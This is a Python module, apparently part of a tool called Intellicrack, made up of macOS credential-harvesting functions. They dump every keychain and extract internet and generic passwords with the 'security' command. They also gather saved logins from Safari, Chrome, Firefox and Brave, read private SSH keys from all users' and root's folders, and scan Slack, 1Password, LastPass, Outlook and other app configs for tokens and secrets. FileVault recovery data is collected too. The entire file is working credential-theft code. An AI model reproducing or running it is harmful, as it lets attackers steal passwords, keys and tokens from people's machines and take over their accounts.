"""macOS credential harvesting methods for Intellicrack"""

import json
import os
import subprocess
from typing import Any


def _macos_keychain_extraction(self) -> dict[str, Any]:
    """Extract credentials from macOS Keychain."""
    credentials = {"keychain_credentials": []}

    try:
        # List all keychains
        keychain_list_cmd = ["security", "list-keychains"]
        result = subprocess.run(
            keychain_list_cmd,
            check=False,
            capture_output=True,
            text=True,
            timeout=10
        )

        if result.returncode == 0:
            keychains = result.stdout.strip().split("\n")

            for keychain_path in keychains:
                # Clean up the path
                keychain_path = keychain_path.strip().strip('"')

                # Dump keychain items
                dump_cmd = ["security", "dump-keychain", keychain_path]
                dump_result = subprocess.run(
                    dump_cmd,
                    check=False,
                    capture_output=True,
                    text=True,
                    timeout=30
                )

                if dump_result.returncode == 0:
                    # Parse keychain dump
                    items = self._parse_keychain_dump(dump_result.stdout)

                    for item in items:
                        credentials["keychain_credentials"].append({
                            "keychain": os.path.basename(keychain_path),
                            "item_type": item.get("class", "unknown"),
                            "service": item.get("service", ""),
                            "account": item.get("account", ""),
                            "server": item.get("server", ""),
                            "protocol": item.get("protocol", ""),
                            "auth_type": item.get("auth_type", ""),
                            "port": item.get("port", ""),
                            "path": item.get("path", ""),
                            "source": "keychain",
                            "note": "Password requires keychain unlock"
                        })

        # Try to extract internet passwords
        internet_cmd = ["security", "find-internet-password", "-g"]
        internet_result = subprocess.run(
            internet_cmd,
            check=False,
            capture_output=True,
            text=True,
            timeout=10
        )

        if internet_result.returncode == 0 or internet_result.stderr:
            # Password is often in stderr
            password_info = self._extract_keychain_password_info(
                internet_result.stdout + internet_result.stderr
            )
            if password_info:
                credentials["keychain_credentials"].append(password_info)

        # Try to extract generic passwords
        generic_cmd = ["security", "find-generic-password", "-g"]
        generic_result = subprocess.run(
            generic_cmd,
            check=False,
            capture_output=True,
            text=True,
            timeout=10
        )

        if generic_result.returncode == 0 or generic_result.stderr:
            password_info = self._extract_keychain_password_info(
                generic_result.stdout + generic_result.stderr
            )
            if password_info:
                credentials["keychain_credentials"].append(password_info)

    except FileNotFoundError:
        self.logger.warning("security command not found - not running on macOS")
    except Exception as e:
        self.logger.error("Error extracting macOS keychain: %s", e)

    return credentials

def _macos_browser_passwords(self) -> dict[str, Any]:
    """Extract browser passwords from macOS."""
    credentials = {"browser_passwords": []}

    try:
        # Safari passwords are stored in Keychain
        safari_keychain_path = os.path.expanduser("~/Library/Keychains/login.keychain-db")

        if os.path.exists(safari_keychain_path):
            # Safari stores passwords in keychain - use security command
            safari_cmd = ["security", "find-internet-password", "-s", "*", "-a", "*", "-D", "Safari Web Form", safari_keychain_path]

            try:
                result = subprocess.run(
                    safari_cmd,
                    check=False,
                    capture_output=True,
                    text=True,
                    timeout=10
                )

                if result.returncode == 0 or result.stderr:
                    # Parse Safari credentials
                    safari_creds = self._parse_safari_keychain(result.stdout + result.stderr)
                    if safari_creds:
                        credentials["browser_passwords"].extend(safari_creds)

            except Exception as e:
                self.logger.debug("Error extracting Safari passwords: %s", e)

        # Chrome on macOS
        chrome_paths = [
            os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Login Data"),
            os.path.expanduser("~/Library/Application Support/Google/Chrome/Profile */Login Data"),
        ]

        for chrome_path in chrome_paths:
            if "*" in chrome_path:
                import glob
                matching_paths = glob.glob(chrome_path)
                for path in matching_paths:
                    chrome_creds = self._extract_browser_credentials(path, "chrome")
                    if chrome_creds:
                        credentials["browser_passwords"].extend(chrome_creds)
            elif os.path.exists(chrome_path):
                chrome_creds = self._extract_browser_credentials(chrome_path, "chrome")
                if chrome_creds:
                    credentials["browser_passwords"].extend(chrome_creds)

        # Firefox on macOS
        firefox_path = os.path.expanduser("~/Library/Application Support/Firefox/Profiles")

        if os.path.exists(firefox_path):
            for profile in os.listdir(firefox_path):
                profile_path = os.path.join(firefox_path, profile)
                if os.path.isdir(profile_path):
                    logins_file = os.path.join(profile_path, "logins.json")
                    if os.path.exists(logins_file):
                        try:
                            with open(logins_file, encoding="utf-8") as f:
                                logins_data = json.load(f)

                            for login in logins_data.get("logins", []):
                                credentials["browser_passwords"].append({
                                    "browser": "firefox",
                                    "profile": profile,
                                    "hostname": login.get("hostname", ""),
                                    "username": login.get("encryptedUsername", ""),
                                    "password": login.get("encryptedPassword", ""),
                                    "source": "firefox_profile",
                                    "note": "Encrypted with master password"
                                })
                        except Exception as e:
                            self.logger.debug("Error reading Firefox logins: %s", e)

        # Brave on macOS
        brave_path = os.path.expanduser("~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Login Data")

        if os.path.exists(brave_path):
            brave_creds = self._extract_browser_credentials(brave_path, "brave")
            if brave_creds:
                credentials["browser_passwords"].extend(brave_creds)

    except Exception as e:
        self.logger.error("Error extracting macOS browser passwords: %s", e)

    return credentials

def _macos_ssh_keys(self) -> dict[str, Any]:
    """Extract SSH keys from macOS."""
    credentials = {"ssh_keys": []}

    try:
        ssh_paths = [
            os.path.expanduser("~/.ssh/"),
            "/var/root/.ssh/",
            "/Users/*/.ssh/",
        ]

        for ssh_path in ssh_paths:
            if "*" in ssh_path:
                import glob
                matching_paths = glob.glob(ssh_path)
                paths_to_check = matching_paths
            else:
                paths_to_check = [ssh_path] if os.path.exists(ssh_path) else []

            for path in paths_to_check:
                if os.path.isdir(path):
                    for filename in os.listdir(path):
                        file_path = os.path.join(path, filename)

                        # Check for private keys
                        if not filename.endswith(".pub") and os.path.isfile(file_path):
                            try:
                                with open(file_path, "r") as f:
                                    content = f.read()

                                if "PRIVATE KEY" in content:
                                    key_type = "unknown"
                                    if "RSA" in content:
                                        key_type = "rsa"
                                    elif "DSA" in content:
                                        key_type = "dsa"
                                    elif "EC" in content:
                                        key_type = "ecdsa"
                                    elif "OPENSSH" in content:
                                        key_type = "ed25519"

                                    credentials["ssh_keys"].append({
                                        "path": file_path,
                                        "filename": filename,
                                        "key_type": key_type,
                                        "owner": os.path.basename(os.path.dirname(path)),
                                        "permissions": oct(os.stat(file_path).st_mode)[-3:],
                                        "size": os.path.getsize(file_path),
                                        "source": "ssh_directory"
                                    })

                                    # Check for corresponding public key
                                    pub_path = f"{file_path}.pub"
                                    if os.path.exists(pub_path):
                                        with open(pub_path, "r") as f:
                                            pub_content = f.read().strip()

                                        credentials["ssh_keys"][-1]["public_key"] = pub_content[:100] + "..." if len(pub_content) > 100 else pub_content

                            except Exception as e:
                                self.logger.debug("Error reading SSH key %s: %s", file_path, e)

        # Check SSH agent for loaded keys
        try:
            ssh_add_result = subprocess.run(
                ["ssh-add", "-l"],
                check=False,
                capture_output=True,
                text=True,
                timeout=5
            )

            if ssh_add_result.returncode == 0:
                loaded_keys = []
                for line in ssh_add_result.stdout.strip().split("\n"):
                    if line:
                        parts = line.split()
                        if len(parts) >= 3:
                            loaded_keys.append({
                                "bits": parts[0],
                                "fingerprint": parts[1],
                                "comment": " ".join(parts[2:]),
                                "source": "ssh_agent"
                            })

                if loaded_keys:
                    credentials["ssh_keys"].append({
                        "type": "ssh_agent_keys",
                        "loaded_keys": loaded_keys,
                        "source": "ssh_agent"
                    })

        except Exception as e:
            self.logger.debug("Error checking SSH agent: %s", e)

    except Exception as e:
        self.logger.error("Error extracting macOS SSH keys: %s", e)

    return credentials

def _macos_application_passwords(self) -> dict[str, Any]:
    """Extract application-specific passwords from macOS."""
    credentials = {"application_passwords": []}

    try:
        # Common application preference locations
        app_pref_paths = [
            "~/Library/Preferences/",
            "~/Library/Application Support/",
            "~/Library/Containers/",
        ]

        # Applications known to store credentials
        target_apps = [
            "com.apple.mail",
            "com.microsoft.Outlook",
            "com.tinyspeck.slackmacgap",
            "com.spotify.client",
            "com.dropbox.Dropbox",
            "com.getdropbox.dropbox",
            "com.agilebits.onepassword",
            "com.lastpass.LastPass",
            "com.github.GitHubClient",
            "com.microsoft.teams",
            "com.apple.iChat",
            "com.skype.skype",
        ]

        for pref_path in app_pref_paths:
            expanded_path = os.path.expanduser(pref_path)

            if os.path.exists(expanded_path):
                for app_id in target_apps:
                    # Check for plist files
                    plist_path = os.path.join(expanded_path, f"{app_id}.plist")

                    if os.path.exists(plist_path):
                        try:
                            # Use plutil to convert plist to JSON
                            plutil_cmd = ["plutil", "-convert", "json", "-o", "-", plist_path]
                            result = subprocess.run(
                                plutil_cmd,
                                check=False,
                                capture_output=True,
                                text=True,
                                timeout=5
                            )

                            if result.returncode == 0:
                                plist_data = json.loads(result.stdout)

                                # Extract potential credentials
                                app_creds = self._extract_credentials_from_plist(plist_data, app_id)

                                if app_creds:
                                    credentials["application_passwords"].append({
                                        "application": app_id,
                                        "credentials": app_creds,
                                        "source": plist_path,
                                        "type": "plist"
                                    })

                        except Exception as e:
                            self.logger.debug("Error reading plist %s: %s", plist_path, e)

                    # Check for application support directories
                    app_support_path = os.path.join(expanded_path, app_id.split(".")[-1])

                    if os.path.exists(app_support_path) and os.path.isdir(app_support_path):
                        # Search for config files
                        for root, dirs, files in os.walk(app_support_path):
                            for file in files:
                                if any(ext in file.lower() for ext in [".conf", ".cfg", ".ini", ".json", ".db"]):
                                    file_path = os.path.join(root, file)

                                    try:
                                        # Extract credentials from config files
                                        file_creds = self._extract_credentials_from_file(file_path)

                                        if file_creds:
                                            credentials["application_passwords"].append({
                                                "application": app_id,
                                                "config_file": file_path,
                                                "credentials": file_creds,
                                                "source": "app_support",
                                                "type": "config"
                                            })

                                    except Exception as e:
                                        self.logger.debug("Error reading app config %s: %s", file_path, e)

        # FileVault recovery key (if accessible)
        filevault_plist = "/Library/Preferences/com.apple.fderecoveryagent.plist"

        if os.path.exists(filevault_plist) and os.access(filevault_plist, os.R_OK):
            try:
                plutil_cmd = ["plutil", "-convert", "json", "-o", "-", filevault_plist]
                result = subprocess.run(
                    plutil_cmd,
                    check=False,
                    capture_output=True,
                    text=True,
                    timeout=5
                )

                if result.returncode == 0:
                    filevault_data = json.loads(result.stdout)

                    credentials["application_passwords"].append({
                        "type": "filevault",
                        "data": filevault_data,
                        "source": filevault_plist,
                        "note": "FileVault recovery information"
                    })

            except Exception as e:
                self.logger.debug("Error reading FileVault plist: %s", e)

    except Exception as e:
        self.logger.error("Error extracting macOS application passwords: %s", e)

    return credentials

def _parse_keychain_dump(self, dump_text: str) -> list[dict[str, Any]]:
    """Parse macOS keychain dump output."""
    items = []
    current_item = {}

    for line in dump_text.split("\n"):
        line = line.strip()

        if line.startswith("keychain:"):
            if current_item:
                items.append(current_item)
            current_item = {}
        elif ":" in line:
            # Parse key-value pairs
            key, value = line.split(":", 1)
            key = key.strip().replace(" ", "_").lower()
            value = value.strip().strip('"')

            if key and value:
                current_item[key] = value

    if current_item:
        items.append(current_item)

    return items

def _extract_keychain_password_info(self, text: str) -> dict[str, Any] | None:
    """Extract password information from keychain output."""
    info = {}

    for line in text.split("\n"):
        if "password:" in line.lower():
            # Extract password (usually after 'password:')
            parts = line.split(":", 1)
            if len(parts) > 1:
                password = parts[1].strip().strip('"')
                if password and password != "(null)":
                    info["password"] = password
        elif "account:" in line.lower():
            parts = line.split(":", 1)
            if len(parts) > 1:
                info["account"] = parts[1].strip().strip('"')
        elif "server:" in line.lower():
            parts = line.split(":", 1)
            if len(parts) > 1:
                info["server"] = parts[1].strip().strip('"')
        elif "service:" in line.lower():
            parts = line.split(":", 1)
            if len(parts) > 1:
                info["service"] = parts[1].strip().strip('"')

    return info if info else None

def _parse_safari_keychain(self, text: str) -> list[dict[str, Any]]:
    """Parse Safari keychain entries."""
    credentials = []
    current_entry = {}

    for line in text.split("\n"):
        line = line.strip()

        if line.startswith("keychain:") and current_entry:
            credentials.append(current_entry)
            current_entry = {}
        elif "server:" in line.lower():
            current_entry["url"] = line.split(":", 1)[1].strip().strip('"')
        elif "account:" in line.lower():
            current_entry["username"] = line.split(":", 1)[1].strip().strip('"')
        elif "password:" in line.lower():
            password = line.split(":", 1)[1].strip().strip('"')
            if password != "(null)":
                current_entry["password"] = password
                current_entry["browser"] = "safari"
                current_entry["source"] = "keychain"

    if current_entry:
        credentials.append(current_entry)

    return credentials

def _extract_credentials_from_plist(self, plist_data: dict, app_id: str) -> list[dict[str, Any]]:
    """Extract credentials from plist data."""
    credentials = []

    def search_dict(d, path=""):
        for key, value in d.items():
            current_path = f"{path}.{key}" if path else key

            # Check for credential-related keys
            if any(keyword in key.lower() for keyword in ["password", "token", "secret", "key", "credential"]):
                if isinstance(value, str) and value and len(value) > 3:
                    credentials.append({
                        "key": current_path,
                        "value": value[:50] + "..." if len(value) > 50 else value,
                        "type": "plist_credential"
                    })
            elif isinstance(value, dict):
                search_dict(value, current_path)
            elif isinstance(value, list):
                for i, item in enumerate(value):
                    if isinstance(item, dict):
                        search_dict(item, f"{current_path}[{i}]")

    search_dict(plist_data)
    return credentials
